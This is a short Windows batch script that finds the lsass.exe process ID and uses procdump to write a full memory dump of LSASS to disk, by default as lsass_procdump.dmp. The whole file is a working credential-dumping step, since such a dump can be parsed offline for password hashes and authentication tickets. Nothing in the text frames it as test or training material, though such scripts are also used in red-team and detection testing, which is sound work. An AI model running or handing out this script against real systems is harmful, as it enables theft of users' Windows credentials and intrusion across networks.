@echo off
setlocal EnableDelayedExpansion

if "%~1"=="" goto :default

set OUTFILE=%~f1
if "!OUTFILE:~-1!"=="\" set OUTFILE=!OUTFILE:~0,-1!
if exist "!OUTFILE!\" set OUTFILE=!OUTFILE!\lsass_procdump.dmp
goto :run

:default
set OUTFILE=%~dp0lsass_procdump.dmp

:run
for /f "tokens=2" %%i in ('C:\Windows\System32\tasklist.exe /fi "imagename eq lsass.exe" /nh') do set PID=%%i
echo LSASS PID: %PID%
"%~dp0procdump.exe" -accepteula -ma %PID% "!OUTFILE!"
echo Done.
dir "!OUTFILE!"
